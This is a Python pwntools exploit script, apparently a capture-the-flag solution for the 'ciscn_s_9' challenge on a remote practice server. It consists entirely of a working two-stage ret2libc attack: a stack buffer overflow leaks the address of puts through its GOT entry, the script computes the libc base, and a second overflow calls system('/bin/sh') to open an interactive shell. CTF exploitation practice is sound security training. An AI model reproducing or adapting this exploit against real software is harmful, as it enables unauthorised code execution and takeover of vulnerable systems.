from pwn import *

#context.log_level = 'debug'

#p = process('./ciscn_s_9')
p = remote('node4.buuoj.cn', 29078)
elf = ELF('ciscn_s_9')

#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.27.so')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pwn = elf.sym['pwn']

payload = b'a' * ( 0x20 + 4 ) + p32(puts_plt) + p32(pwn) + p32(puts_got)

p.sendlineafter(b'>\n', payload)

p.recvuntil('\n')

puts_real_addr = u32(p.recv(4))

libc_base = puts_real_addr - libc.sym['puts']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * ( 0x20 + 4 ) + p32(system) + p32(0) + p32(bin_sh)

p.sendlineafter(b'>\n', payload)

p.interactive()

pause()